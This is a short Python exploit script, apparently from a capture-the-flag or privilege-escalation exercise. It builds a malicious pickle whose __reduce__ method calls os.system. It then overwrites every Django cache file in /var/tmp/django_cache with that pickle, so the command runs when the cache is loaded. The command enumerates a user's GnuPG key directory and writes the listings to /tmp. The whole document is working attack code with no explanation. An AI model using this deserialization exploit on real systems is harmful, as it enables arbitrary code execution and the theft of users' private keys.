#!/usr/bin/env python3
import pickle
import os

CACHE_DIR = "/var/tmp/django_cache"

# Find GPG keys
cmd = "find /home/sandy/.gnupg -type f 2>/dev/null > /tmp/gpg_files.txt; ls -laR /home/sandy/.gnupg > /tmp/gpg_list.txt 2>&1"

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

for filename in os.listdir(CACHE_DIR):
    if filename.endswith(".djcache"):
        path = os.path.join(CACHE_DIR, filename)
        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)

print("[+] Payload written")
